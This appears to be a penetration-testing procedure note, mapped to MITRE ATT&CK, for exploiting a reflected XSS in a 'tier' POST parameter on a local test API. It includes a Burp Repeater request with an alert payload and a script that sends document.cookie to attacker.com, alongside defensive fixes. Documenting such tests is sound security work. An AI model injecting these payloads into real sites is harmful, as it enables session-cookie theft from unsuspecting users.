---
id: proc-uuid-3
tags:
  - xss-injection
  - payload-execution
  - burp-suite
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T03:46:37.388Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Inject-XSS-Payload-into-Tier-Parameter

## Summary

This procedure exploits the reflected XSS vulnerability by injecting a JavaScript payload into the 'tier' POST parameter of the /users/[id]/set_tier endpoint, leveraging the missing Content-Type header to execute the script in the browser.

## Description

The UserController.php (line 93) returns JSON without setting Content-Type: application/json, causing browsers to interpret it as text/html. The 'tier' parameter is reflected unsanitized, allowing payloads like <script>alert('XSS')</script> to execute. Bypasses for escapes (\, ", /) use HTML comments. Impact includes cookie theft via document.cookie or privilege escalation by tricking users.

## Requirements

1. Authenticated admin access with API key
2. Burp Suite for request interception
3. Test API instance running
4. Browser for payload execution verification

## Defense

Defensive measures and detection strategies:

- Set explicit Content-Type: application/json headers in API responses
- Sanitize and escape reflected parameters (e.g., htmlspecialchars in PHP)
- Implement CSP headers to block inline scripts
- Monitor for anomalous POST payloads in WAF logs

## Objectives

1. Trigger JavaScript execution via reflected input
2. Demonstrate cookie theft or escalation
3. Validate vulnerability presence

## Instructions

### Step 1: Intercept Request with Burp Suite

**Context**: Configure Burp to proxy traffic and capture the POST to /users/[id]/set_tier.

Launch Burp and set browser proxy:

No command; configure via Burp UI to intercept HTTPS traffic.

> Point browser to proxy at 127.0.0.1:8080. Send an initial POST request to trigger interception.

### Step 2: Modify and Inject Payload

**Context**: Alter the 'tier' parameter with XSS payload, bypassing escapes.

In Burp Repeater, modify request:

```http
POST /users/1/set_tier HTTP/1.1
Host: localhost:8000
Authorization: Bearer test-api-key-123
Content-Type: application/x-www-form-urlencoded

tier=<script>alert('XSS')</script>&id=1
```

> Use payload like `<script>fetch('http://attacker.com?cookie='+document.cookie)</script>` for exfiltration. Forward the request.

### Step 3: Verify Execution

**Context**: Observe the response in browser; due to text/html parsing, script executes.

View response in browser or Burp:

The response JSON echoes 'tier' value, parsed as HTML.

> Alert pops or network request to attacker server confirms success. Check console for errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss-injection]]
- [[payload-execution]]
